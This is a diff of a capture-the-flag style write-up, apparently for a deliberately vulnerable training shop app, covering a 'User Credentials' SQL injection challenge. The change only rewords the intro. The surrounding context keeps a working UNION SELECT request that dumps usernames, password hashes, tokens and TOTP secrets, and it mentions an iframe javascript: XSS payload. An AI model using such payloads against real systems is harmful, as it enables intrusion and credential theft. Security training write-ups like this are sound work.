@@ -194,10 +194,7 @@ Bingo, the nested ```<iframe src="javascript:alert(`xss`)">``` string is deleted
 ## User Credentials (Injection)
 _Retrieve a list of all user credentials via SQL Injection._
 
-This challenge follows the [Database Schema](level3.md#database-schema-injection) challenge.
-It's much easier once we have [misc/db-schema.sql](misc/db-schema.sql).
-
-I also used a similar query:
+This challenge follows the [Database Schema](level3.md#database-schema-injection) challenge:
 ```
 GET /rest/products/search?q=Apple'))+UNION+SELECT+username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive+FROM+Users--
 ```
